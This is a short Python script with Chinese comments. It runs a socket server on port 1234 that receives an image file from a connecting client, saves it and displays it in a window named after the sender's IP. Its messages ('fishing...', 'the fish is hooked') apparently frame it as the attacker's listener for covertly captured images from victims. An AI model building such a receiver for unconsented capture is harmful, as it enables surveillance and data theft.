from socket import *
import cv2
socket = socket()
socket.bind((gethostname(), 1234))
socket.listen()
print('正在钓鱼中...',gethostname())

sock, addr = socket.accept()
wnd_name = addr[0]
print('鱼已上钩，ip为：', wnd_name)

    # 1 接收客户端的文件大小
size = int(sock.recv(2048).decode())

    # 2 告诉客户端 大小接收完毕
sock.send('da xiao'.encode())

    # 3 打开文件 接收客户端图片数据 写入文件
file = open('1.png', 'wb')
size1 = 0
while size1 < size:
    data = sock.recv(2048)
    file.write(data)
    size1 += len(data)
file.close()

    # 4. 告诉客户端 文件接收完毕
sock.send('wan cheng'.encode())

    # 创建窗口并显示图像
image = cv2.imread('1.png')
cv2.imshow(wnd_name, image)
cv2.waitKey()